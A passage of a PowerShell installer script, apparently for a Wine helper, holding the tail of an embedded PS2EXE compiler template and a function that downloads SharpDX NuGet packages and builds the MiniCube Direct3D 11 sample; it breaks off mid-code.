"@ } })
		}

		private System.Security.SecureString getPassword()
		{
			System.Security.SecureString pwd = new System.Security.SecureString();
			while (true)
			{
				ConsoleKeyInfo i = Console.ReadKey(true);
				if (i.Key == ConsoleKey.Enter)
				{
					Console.WriteLine();
					break;
				}
				else if (i.Key == ConsoleKey.Backspace)
				{
					if (pwd.Length > 0)
					{
						pwd.RemoveAt(pwd.Length - 1);
						Console.Write("\b \b");
					}
				}
				else if (i.KeyChar != '\u0000')
				{
					pwd.AppendChar(i.KeyChar);
					Console.Write("*");
				}
			}
			return pwd;
		}

		public override System.Security.SecureString ReadLineAsSecureString()
		{
			System.Security.SecureString secstr = new System.Security.SecureString();
$(if (!$noConsole) {@"
			secstr = getPassword();
"@ } else {@"
			string sWert = "";

			if (Input_Box.Show(ib_caption, ib_message, ref sWert, true) == DialogResult.OK)
			{
				foreach (char ch in sWert)
					secstr.AppendChar(ch);
			}
"@ })
$(if ($noConsole) { if ($exitOnCancel) {@"
			else
				Environment.Exit(1);
"@ } })
			return secstr;
		}

		// called by Write-Host
		public override void Write(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			ConsoleColor fgc = Console.ForegroundColor, bgc = Console.BackgroundColor;
			Console.ForegroundColor = foregroundColor;
			Console.BackgroundColor = backgroundColor;
			Console.Write(value);
			Console.ForegroundColor = fgc;
			Console.BackgroundColor = bgc;
"@ } else {@"
			if ((!string.IsNullOrEmpty(value)) && (value != "\n"))
				MessageBox.Show(value, System.AppDomain.CurrentDomain.FriendlyName);
"@ } })
		}

		public override void Write(string value)
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			Console.Write(value);
"@ } else {@"
			if ((!string.IsNullOrEmpty(value)) && (value != "\n"))
				MessageBox.Show(value, System.AppDomain.CurrentDomain.FriendlyName);
"@ } })
		}

		// called by Write-Debug
		public override void WriteDebugLine(string message)
		{
$(if (!$noError) { if (!$noConsole) {@"
			WriteLineInternal(DebugForegroundColor, DebugBackgroundColor, string.Format("DEBUG: {0}", message));
"@ } else {@"
			MessageBox.Show(message, System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Information);
"@ } })
		}

		// called by Write-Error
		public override void WriteErrorLine(string value)
		{
$(if (!$noError) { if (!$noConsole) {@"
			if (Console_Info.IsErrorRedirected())
				Console.Error.WriteLine(string.Format("ERROR: {0}", value));
			else
				WriteLineInternal(ErrorForegroundColor, ErrorBackgroundColor, string.Format("ERROR: {0}", value));
"@ } else {@"
			MessageBox.Show(value, System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Error);
"@ } })
		}

		public override void WriteLine()
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			Console.WriteLine();
"@ } else {@"
			MessageBox.Show("", System.AppDomain.CurrentDomain.FriendlyName);
"@ } })
		}

		public override void WriteLine(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			ConsoleColor fgc = Console.ForegroundColor, bgc = Console.BackgroundColor;
			Console.ForegroundColor = foregroundColor;
			Console.BackgroundColor = backgroundColor;
			Console.WriteLine(value);
			Console.ForegroundColor = fgc;
			Console.BackgroundColor = bgc;
"@ } else {@"
			if ((!string.IsNullOrEmpty(value)) && (value != "\n"))
				MessageBox.Show(value, System.AppDomain.CurrentDomain.FriendlyName);
"@ } })
		}

$(if (!$noError -And !$noConsole) {@"
		private void WriteLineInternal(ConsoleColor foregroundColor, ConsoleColor backgroundColor, string value)
		{
			ConsoleColor fgc = Console.ForegroundColor, bgc = Console.BackgroundColor;
			Console.ForegroundColor = foregroundColor;
			Console.BackgroundColor = backgroundColor;
			Console.WriteLine(value);
			Console.ForegroundColor = fgc;
			Console.BackgroundColor = bgc;
		}
"@ })

		// called by Write-Output
		public override void WriteLine(string value)
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			Console.WriteLine(value);
"@ } else {@"
			if ((!string.IsNullOrEmpty(value)) && (value != "\n"))
				MessageBox.Show(value, System.AppDomain.CurrentDomain.FriendlyName);
"@ } })
		}

$(if ($noConsole) {@"
		public Progress_Form pf = null;
"@ })
		public override void WriteProgress(long sourceId, ProgressRecord record)
		{
$(if ($noConsole) {@"
			if (pf == null)
			{
				if (record.RecordType == ProgressRecordType.Completed) return;
				pf = new Progress_Form(ProgressForegroundColor);
				pf.Show();
			}
			pf.Update(record);
			if (record.RecordType == ProgressRecordType.Completed)
			{
				if (pf.GetCount() == 0) pf = null;
			}
"@ })
		}

		// called by Write-Verbose
		public override void WriteVerboseLine(string message)
		{
$(if (!$noOutput) { if (!$noConsole) {@"
			WriteLine(VerboseForegroundColor, VerboseBackgroundColor, string.Format("VERBOSE: {0}", message));
"@ } else {@"
			MessageBox.Show(message, System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Information);
"@ } })
		}

		// called by Write-Warning
		public override void WriteWarningLine(string message)
		{
$(if (!$noError) { if (!$noConsole) {@"
			WriteLineInternal(WarningForegroundColor, WarningBackgroundColor, string.Format("WARNING: {0}", message));
"@ } else {@"
			MessageBox.Show(message, System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Warning);
"@ } })
		}
	}

	internal class MainModule : PSHost
	{
		private MainAppInterface parent;
		private MainModuleUI ui = null;

		private CultureInfo originalCultureInfo = System.Threading.Thread.CurrentThread.CurrentCulture;

		private CultureInfo originalUICultureInfo = System.Threading.Thread.CurrentThread.CurrentUICulture;

		private Guid myId = Guid.NewGuid();

		public MainModule(MainAppInterface app, MainModuleUI ui)
		{
			this.parent = app;
			this.ui = ui;
		}

		public class ConsoleColorProxy
		{
			private MainModuleUI _ui;

			public ConsoleColorProxy(MainModuleUI ui)
			{
				if (ui == null) throw new ArgumentNullException("ui");
				_ui = ui;
			}

			public ConsoleColor ErrorForegroundColor
			{
				get
				{ return _ui.ErrorForegroundColor; }
				set
				{ _ui.ErrorForegroundColor = value; }
			}

			public ConsoleColor ErrorBackgroundColor
			{
				get
				{ return _ui.ErrorBackgroundColor; }
				set
				{ _ui.ErrorBackgroundColor = value; }
			}

			public ConsoleColor WarningForegroundColor
			{
				get
				{ return _ui.WarningForegroundColor; }
				set
				{ _ui.WarningForegroundColor = value; }
			}

			public ConsoleColor WarningBackgroundColor
			{
				get
				{ return _ui.WarningBackgroundColor; }
				set
				{ _ui.WarningBackgroundColor = value; }
			}

			public ConsoleColor DebugForegroundColor
			{
				get
				{ return _ui.DebugForegroundColor; }
				set
				{ _ui.DebugForegroundColor = value; }
			}

			public ConsoleColor DebugBackgroundColor
			{
				get
				{ return _ui.DebugBackgroundColor; }
				set
				{ _ui.DebugBackgroundColor = value; }
			}

			public ConsoleColor VerboseForegroundColor
			{
				get
				{ return _ui.VerboseForegroundColor; }
				set
				{ _ui.VerboseForegroundColor = value; }
			}

			public ConsoleColor VerboseBackgroundColor
			{
				get
				{ return _ui.VerboseBackgroundColor; }
				set
				{ _ui.VerboseBackgroundColor = value; }
			}

			public ConsoleColor ProgressForegroundColor
			{
				get
				{ return _ui.ProgressForegroundColor; }
				set
				{ _ui.ProgressForegroundColor = value; }
			}

			public ConsoleColor ProgressBackgroundColor
			{
				get
				{ return _ui.ProgressBackgroundColor; }
				set
				{ _ui.ProgressBackgroundColor = value; }
			}
		}

		public override PSObject PrivateData
		{
			get
			{
				if (ui == null) return null;
				return _consoleColorProxy ?? (_consoleColorProxy = PSObject.AsPSObject(new ConsoleColorProxy(ui)));
			}
		}

		private PSObject _consoleColorProxy;

		public override System.Globalization.CultureInfo CurrentCulture
		{
			get
			{
				return this.originalCultureInfo;
			}
		}

		public override System.Globalization.CultureInfo CurrentUICulture
		{
			get
			{
				return this.originalUICultureInfo;
			}
		}

		public override Guid InstanceId
		{
			get
			{
				return this.myId;
			}
		}

		public override string Name
		{
			get
			{
				return "PSRunspace-Host";
			}
		}

		public override PSHostUserInterface UI
		{
			get
			{
				return ui;
			}
		}

		public override Version Version
		{
			get
			{
				return new Version(0, 5, 0, 27);
			}
		}

		public override void EnterNestedPrompt()
		{
		}

		public override void ExitNestedPrompt()
		{
		}

		public override void NotifyBeginApplication()
		{
			return;
		}

		public override void NotifyEndApplication()
		{
			return;
		}

		public override void SetShouldExit(int exitCode)
		{
			this.parent.ShouldExit = true;
			this.parent.ExitCode = exitCode;
		}
	}

	internal interface MainAppInterface
	{
		bool ShouldExit { get; set; }
		int ExitCode { get; set; }
	}

	internal class MainApp : MainAppInterface
	{
		private bool shouldExit;

		private int exitCode;

		public bool ShouldExit
		{
			get { return this.shouldExit; }
			set { this.shouldExit = value; }
		}

		public int ExitCode
		{
			get { return this.exitCode; }
			set { this.exitCode = value; }
		}

		$(if ($STA){"[STAThread]"})$(if ($MTA){"[MTAThread]"})
		private static int Main(string[] args)
		{
$(if (!$noConsole -and $UNICODEEncoding) {@"
			System.Console.OutputEncoding = new System.Text.UnicodeEncoding();
"@ })
			$culture

			$(if (!$noVisualStyles -and $noConsole) { "Application.EnableVisualStyles();" })
			MainApp me = new MainApp();

			bool paramWait = false;
			string extractFN = string.Empty;

			MainModuleUI ui = new MainModuleUI();
			MainModule host = new MainModule(me, ui);
			System.Threading.ManualResetEvent mre = new System.Threading.ManualResetEvent(false);

			AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);

			try
			{
				using (Runspace myRunSpace = RunspaceFactory.CreateRunspace(host))
				{
					$(if ($STA -or $MTA) {"myRunSpace.ApartmentState = System.Threading.ApartmentState."})$(if ($STA){"STA"})$(if ($MTA){"MTA"});
					myRunSpace.Open();

					using (PowerShell pwsh = PowerShell.Create())
					{
$(if (!$noConsole) {@"
						Console.CancelKeyPress += new ConsoleCancelEventHandler(delegate(object sender, ConsoleCancelEventArgs e)
						{
							try
							{
								pwsh.BeginStop(new AsyncCallback(delegate(IAsyncResult r)
								{
									mre.Set();
									e.Cancel = true;
								}), null);
							}
							catch
							{
							};
						});
"@ })

						pwsh.Runspace = myRunSpace;
						pwsh.Streams.Error.DataAdded += new EventHandler<DataAddedEventArgs>(delegate(object sender, DataAddedEventArgs e)
						{
							ui.WriteErrorLine(((PSDataCollection<ErrorRecord>)sender)[e.Index].ToString());
						});

						PSDataCollection<string> colInput = new PSDataCollection<string>();
$(if (!$runtime20) {@"
						if (Console_Info.IsInputRedirected())
						{ // read standard input
							string sItem = "";
							while ((sItem = Console.ReadLine()) != null)
							{ // add to powershell pipeline
								colInput.Add(sItem);
							}
						}
"@ })
						colInput.Complete();

						PSDataCollection<PSObject> colOutput = new PSDataCollection<PSObject>();
						colOutput.DataAdded += new EventHandler<DataAddedEventArgs>(delegate(object sender, DataAddedEventArgs e)
						{
							ui.WriteLine(colOutput[e.Index].ToString());
						});

						int separator = 0;
						int idx = 0;
						foreach (string s in args)
						{
							if (string.Compare(s, "-whatt".Replace("hat", "ai"), true) == 0)
								paramWait = true;
							else if (s.StartsWith("-extdummt".Replace("dumm", "rac"), StringComparison.InvariantCultureIgnoreCase))
							{
								string[] s1 = s.Split(new string[] { ":" }, 2, StringSplitOptions.RemoveEmptyEntries);
								if (s1.Length != 2)
								{
$(if (!$noConsole) {@"
									Console.WriteLine("If you spzzcify thzz -zzxtract option you nzzed to add a filzz for zzxtraction in this way\r\n   -zzxtract:\"<filzznamzz>\"".Replace("zz", "e"));
"@ } else {@"
									MessageBox.Show("If you spzzcify thzz -zzxtract option you nzzed to add a filzz for zzxtraction in this way\r\n   -zzxtract:\"<filzznamzz>\"".Replace("zz", "e"), System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Error);
"@ })
									return 1;
								}
								extractFN = s1[1].Trim(new char[] { '\"' });
							}
							else if (string.Compare(s, "-end", true) == 0)
							{
								separator = idx + 1;
								break;
							}
							else if (string.Compare(s, "-debug", true) == 0)
							{
								System.Diagnostics.Debugger.Launch();
								break;
							}
							idx++;
						}

						string script = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"$($script)"));

						if (!string.IsNullOrEmpty(extractFN))
						{
							System.IO.File.WriteAllText(extractFN, script);
							return 0;
						}

						pwsh.AddScript(script);

						// parse parameters
						string argbuffer = null;
						// regex for named parameters
						System.Text.RegularExpressions.Regex regex = new System.Text.RegularExpressions.Regex(@"^-([^: ]+)[ :]?([^:]*)$");

						for (int i = separator; i < args.Length; i++)
						{
							System.Text.RegularExpressions.Match match = regex.Match(args[i]);
							double dummy;

							if ((match.Success && match.Groups.Count == 3) && (!Double.TryParse(args[i], out dummy)))
							{ // parameter in powershell style, means named parameter found
								if (argbuffer != null) // already a named parameter in buffer, then flush it
									pwsh.AddParameter(argbuffer);

								if (match.Groups[2].Value.Trim() == "")
								{ // store named parameter in buffer
									argbuffer = match.Groups[1].Value;
								}
								else
									// caution: when called in powershell $TRUE gets converted, when called in cmd.exe not
									if ((match.Groups[2].Value == "$TRUE") || (match.Groups[2].Value.ToUpper() == "\x24TRUE"))
									{ // switch found
										pwsh.AddParameter(match.Groups[1].Value, true);
										argbuffer = null;
									}
									else
										// caution: when called in powershell $FALSE gets converted, when called in cmd.exe not
										if ((match.Groups[2].Value == "$FALSE") || (match.Groups[2].Value.ToUpper() == "\x24"+"FALSE"))
										{ // switch found
											pwsh.AddParameter(match.Groups[1].Value, false);
											argbuffer = null;
										}
										else
										{ // named parameter with value found
											pwsh.AddParameter(match.Groups[1].Value, match.Groups[2].Value);
											argbuffer = null;
										}
							}
							else
							{ // unnamed parameter found
								if (argbuffer != null)
								{ // already a named parameter in buffer, so this is the value
									pwsh.AddParameter(argbuffer, args[i]);
									argbuffer = null;
								}
								else
								{ // position parameter found
									pwsh.AddArgument(args[i]);
								}
							}
						}

						if (argbuffer != null) pwsh.AddParameter(argbuffer); // flush parameter buffer...

						// convert output to strings
						pwsh.AddCommand("out-string");
						// with a single string per line
						pwsh.AddParameter("stream");

						pwsh.BeginInvoke<string, PSObject>(colInput, colOutput, null, new AsyncCallback(delegate(IAsyncResult ar)
						{
							if (ar.IsCompleted)
								mre.Set();
						}), null);

						while (!me.ShouldExit && !mre.WaitOne(100))
						{ };

						pwsh.Stop();

						if (pwsh.InvocationStateInfo.State == PSInvocationState.Failed)
							ui.WriteErrorLine(pwsh.InvocationStateInfo.Reason.Message);
					}

					myRunSpace.Close();
				}
			}
			catch (Exception ex)
			{
$(if (!$noError) { if (!$noConsole) {@"
				Console.Write("An exception occured: ");
				Console.WriteLine(ex.Message);
"@ } else {@"
				MessageBox.Show("An exception occured: " + ex.Message, System.AppDomain.CurrentDomain.FriendlyName, MessageBoxButtons.OK, MessageBoxIcon.Error);
"@ } })
			}

			if (paramWait)
			{
$(if (!$noConsole) {@"
				Console.WriteLine("Hit any key to exit...");
				Console.ReadKey();
"@ } else {@"
				MessageBox.Show("Click OK to exit...", System.AppDomain.CurrentDomain.FriendlyName);
"@ })
			}
			return me.ExitCode;
		}

		static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
		{
			throw new Exception("Unhandled exception in " + System.AppDomain.CurrentDomain.FriendlyName);
		}
	}
}
"@

$configFileForEXE2 = "<?xml version=""1.0"" encoding=""utf-8"" ?>`r`n<configuration><startup><supportedRuntime version=""v2.0.50727""/></startup></configuration>"
$configFileForEXE3 = "<?xml version=""1.0"" encoding=""utf-8"" ?>`r`n<configuration><startup><supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.0"" /></startup></configuration>"

if ($longPaths)
{
	$configFileForEXE3 = "<?xml version=""1.0"" encoding=""utf-8"" ?>`r`n<configuration><startup><supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.0"" /></startup><runtime><AppContextSwitchOverrides value=""Switch.System.IO.UseLegacyPathHandling=false;Switch.System.IO.BlockLongPaths=false"" /></runtime></configuration>"
}

Write-Output "Compiling file...`n"
$cr = $cop.CompileAssemblyFromSource($cp, $programFrame)
if ($cr.Errors.Count -gt 0)
{
	if (Test-Path $outputFile)
	{
		Remove-Item $outputFile -Verbose:$FALSE
	}
	Write-Error -ErrorAction Continue "Could not create the PowerShell .exe file because of compilation errors. Use -verbose parameter to see details."
	$cr.Errors | ForEach-Object { Write-Verbose $_ }
}
else
{
	if (Test-Path $outputFile)
	{
		Write-Output "Output file $outputFile written"

		if ($prepareDebug)
		{
			$cr.TempFiles | Where-Object { $_ -ilike "*.cs" } | Select-Object -First 1 | ForEach-Object {
				$dstSrc = ([System.IO.Path]::Combine([System.IO.Path]::GetDirectoryName($outputFile), [System.IO.Path]::GetFileNameWithoutExtension($outputFile)+".cs"))
				Write-Output "Source file name for debug copied: $($dstSrc)"
				Copy-Item -Path $_ -Destination $dstSrc -Force
			}
			$cr.TempFiles | Remove-Item -Verbose:$FALSE -Force -ErrorAction SilentlyContinue
		}
		if ($CFGFILE)
		{
			if ($runtime20)
			{
				$configFileForEXE2 | Set-Content ($outputFile+".config") -Encoding UTF8
			}
			if ($runtime40)
			{
				$configFileForEXE3 | Set-Content ($outputFile+".config") -Encoding UTF8
			}
			Write-Output "Config file for EXE created"
		}
	}
	else
	{
		Write-Error -ErrorAction "Continue" "Output file $outputFile not written"
	}
}

if ($requireAdmin -or $DPIAware -or $supportOS -or $longPaths)
{ if (Test-Path $($outputFile+".win32manifest"))
	{
		Remove-Item $($outputFile+".win32manifest") -Verbose:$FALSE
	}
}

'@


  $win_ps2exe | Out-File -FilePath $env:TEMP\\"win-ps2exe.ps1"
  $ps2exe | Out-File -FilePath $env:TEMP\\"ps2exe.ps1"

  start-process -nonewwindow ps51.exe  $env:Temp\\win-ps2exe.ps1 
}

function func_sharpdx2
{
    $dldir = "sharpdx"

    foreach( $i in '.direct3d11', '.dxgi', '.d3dcompiler', '.mathematics', '.direct3d9', '.desktop', '' <# =sharpdx core #> )
    {
        w_download_to $dldir "https://globalcdn.nuget.org/packages/sharpdx$i.4.2.0.nupkg" "sharpdx$i.4.2.0.nupkg"
        if (![System.IO.File]::Exists(  [IO.Path]::Combine($env:systemroot, "system32", "WindowsPowerShell", "v1.0", "SharpDX$i.dll")  )){
           7z e $cachedir\\$dldir\\sharpdx$i.4.2.0.nupkg "-o$env:systemroot\\system32\\WindowsPowerShell\\v1.0" lib/net45/SharpDX$i.dll -y 
        }
    }

$MiniCube=  @"
    struct VS_IN 
    {
	    float4 pos : POSITION;
	    float4 col : COLOR;
    };

    struct PS_IN
    {
	    float4 pos : SV_POSITION;
	    float4 col : COLOR;
    };

    float4x4 worldViewProj;

    PS_IN VS( VS_IN input )
    {
	    PS_IN output = (PS_IN)0;
	
	    output.pos = mul(input.pos, worldViewProj);
	    output.col = input.col;
	
	    return output;
    }

    float4 PS( PS_IN input ) : SV_Target
    {
	    return input.col;
    }
"@
    $MiniCube | Out-File $env:SystemRoot\\system32\\WindowsPowerShell\v1.0\\MiniCube.fx

Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.dll"
Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.Direct3D11.dll"
Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.Mathematics.dll"
Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.D3DCompiler.dll"
Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.Dxgi.dll"
Add-Type -path "$env:systemroot\\system32\\WindowsPowerShell\\v1.0\\SharpDX.Desktop.dll"

Add-Type @'

// Copyright (c) 2010-2013 SharpDX - Alexandre Mutel
// 
// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
using System;
using System.Diagnostics;
using System.Windows.Forms;

using SharpDX;
using SharpDX.D3DCompiler;
using SharpDX.Direct3D;
using SharpDX.Direct3D11;
using SharpDX.DXGI;
using SharpDX.Windows;
using Buffer = SharpDX.Direct3D11.Buffer;
using Device = SharpDX.Direct3D11.Device;

namespace MiniCube5
{
    /// <summary>
    /// SharpDX MiniCube Direct3D 11 Sample
    /// </summary>
    public class Program
    {
  //      [STAThread]
        public void Main()
        {
            var form = new RenderForm("SharpDX - MiniCube Direct3D11 Sample");

            // SwapChain description
            var desc = new SwapChainDescription()
            {
                BufferCount = 1,
                ModeDescription =
                    new ModeDescription(form.ClientSize.Width, form.ClientSize.Height,
                                        new Rational(60, 1), Format.R8G8B8A8_UNorm),
                IsWindowed = true,
                OutputHandle = form.Handle,
                SampleDescription = new SampleDescription(1, 0),
                SwapEffect = SwapEffect.Discard,
                Usage = Usage.RenderTargetOutput
            };

            // Used for debugging dispose object references
            // Configuration.EnableObjectTracking = true;

            // Disable throws on shader compilation errors
            //Configuration.ThrowOnShaderCompileError = false;

            // Create Device and SwapChain
            Device device;
            SwapChain swapChain;
            Device.CreateWithSwapChain(DriverType.Hardware, DeviceCreationFlags.None, desc, out device, out swapChain);
            var context = device.ImmediateContext;

            // Ignore all windows events
            var factory = swapChain.GetParent<Factory>();
            factory.MakeWindowAssociation(form.Handle, WindowAssociationFlags.IgnoreAll);

            // Compile Vertex and Pixel shaders
            var vertexShaderByteCode = ShaderBytecode.CompileFromFile(Environment.SystemDirectory + "\\WindowsPowerShell\\v1.0\\MiniCube.fx", "VS", "vs_4_0");
            var vertexShader = new VertexShader(device, vertexShaderByteCode);

            var pixelShaderByteCode = ShaderBytecode.CompileFromFile(Environment.SystemDirectory + "\\WindowsPowerShell\\v1.0\\MiniCube.fx", "PS", "ps_4_0");
            var pixelShader = new PixelShader(device, pixelShaderByteCode);

            var signature = ShaderSignature.GetInputSignature(vertexShaderByteCode);
            // Layout from VertexShader input signature
            var layout = new InputLayout(device, signature, new[]
                    {
                        new InputElement("POSITION", 0, Format.R32G32B32A32_Float, 0, 0),
                        new InputElement("COLOR", 0, Format.R32G32B32A32_Float, 16, 0)
                    });

            // Instantiate Vertex buiffer from vertex data
            var vertices = Buffer.Create(device, BindFlags.VertexBuffer, new[]
                                  {
                                      new Vector4(-1.0f, -1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f), // Front
                                      new Vector4(-1.0f,  1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f,  1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f),
                                      new Vector4(-1.0f, -1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f,  1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f, -1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 0.0f, 1.0f),

                                      new Vector4(-1.0f, -1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f), // BACK
                                      new Vector4( 1.0f,  1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4(-1.0f,  1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4(-1.0f, -1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f, -1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f,  1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 0.0f, 1.0f),

                                      new Vector4(-1.0f, 1.0f, -1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f), // Top
                                      new Vector4(-1.0f, 1.0f,  1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f, 1.0f,  1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4(-1.0f, 1.0f, -1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f, 1.0f,  1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f, 1.0f, -1.0f,  1.0f), new Vector4(0.0f, 0.0f, 1.0f, 1.0f),

                                      new Vector4(-1.0f,-1.0f, -1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f), // Bottom
                                      new Vector4( 1.0f,-1.0f,  1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4(-1.0f,-1.0f,  1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4(-1.0f,-1.0f, -1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f,-1.0f, -1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f),
                                      new Vector4( 1.0f,-1.0f,  1.0f,  1.0f), new Vector4(1.0f, 1.0f, 0.0f, 1.0f),

                                      new Vector4(-1.0f, -1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f), // Left
                                      new Vector4(-1.0f, -1.0f,  1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4(-1.0f,  1.0f,  1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4(-1.0f, -1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4(-1.0f,  1.0f,  1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f),
                                      new Vector4(-1.0f,  1.0f, -1.0f, 1.0f), new Vector4(1.0f, 0.0f, 1.0f, 1.0f),

                                      new Vector4( 1.0f, -1.0f, -1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f), // Right
                                      new Vector4( 1.0f,  1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f, -1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f, -1.0f, -1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f,  1.0f, -1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f),
                                      new Vector4( 1.0f,  1.0f,  1.0f, 1.0f), new Vector4(0.0f, 1.0f, 1.0f, 1.0f),
                            });

            // Create Constant Buffer
            var contantBuffer = new Buffer(device, Utilities.SizeOf<Matrix>(), ResourceUsage.Default, BindFlags.ConstantBuffer, CpuAccessFlags.None, ResourceOptionFlags.None, 0);

            // Prepare All the stages
            context.InputAssembler.InputLayout = layout;
            context.InputAssembler.PrimitiveTopology = PrimitiveTopology.TriangleList;
            context.InputAssembler.SetVertexBuffers(0, new VertexBufferBinding(vertices, Utilities.SizeOf<Vector4>() * 2, 0));
            context.VertexShader.SetConstantBuffer(0, contantBuffer);
            context.VertexShader.Set(vertexShader);
            context.PixelShader.Set(pixelShader);

            // Prepare matrices
            var view = Matrix.LookAtLH(new Vector3(0, 0, -5), new Vector3(0, 0, 0), Vector3.UnitY);
            Matrix proj = Matrix.Identity;

            // Use clock
            var clock = new Stopwatch();
            clock.Start();

            // Declare texture for rendering
            bool userResized = true;
            Texture2D backBuffer = null;
            RenderTargetView renderView = null;
            Texture2D depthBuffer = null;
            DepthStencilView depthView = null;

            // Setup handler on resize form
            form.UserResized += (sender, args) => userResized = true;

            // Setup full screen mode change F5 (Full) F4 (Window)
            form.KeyUp += (sender, args) =>
                {
                    if (args.KeyCode == Keys.F5)
                        swapChain.SetFullscreenState(true, null);
                    else if (args.KeyCode == Keys.F4)
                        swapChain.SetFullscreenState(false, null);
                    else if (args.KeyCode == Keys.Escape)
                        form.Close();
                };

            // Main loop
            RenderLoop.Run(form, () =>
            {
                // If Form resized
                if (userResized)
                {
                    // Dispose all previous allocated resources
                    Utilities.Dispose(ref backBuffer);
                    Utilities.Dispose(ref renderView);
                    Utilities.Dispose(ref depthBuffer);
                    Utilities.Dispose(ref depthView);

                    // Resize the backbuffer
                    swapChain.ResizeBuffers(desc.BufferCount, form.ClientSize.Width, form.ClientSize.Height, Format.Unknown, SwapChainFlags.None);

                    // Get the backbuffer from the swapchain
                    backBuffer = Texture2D.FromSwapChain<Texture2D>(swapChain, 0);

                    // Renderview on the backbuffer
                    renderView = new RenderTargetView(device, backBuffer);

                    // Create the depth buffer
                    depthBuffer = new Texture2D(device, new Texture2DDescription()
                    {
                        Format = Format.D32_Float_S8X24_UInt,
                        ArraySize = 1,
                        MipLevels = 1,
                        Width = form.ClientSize.Width,
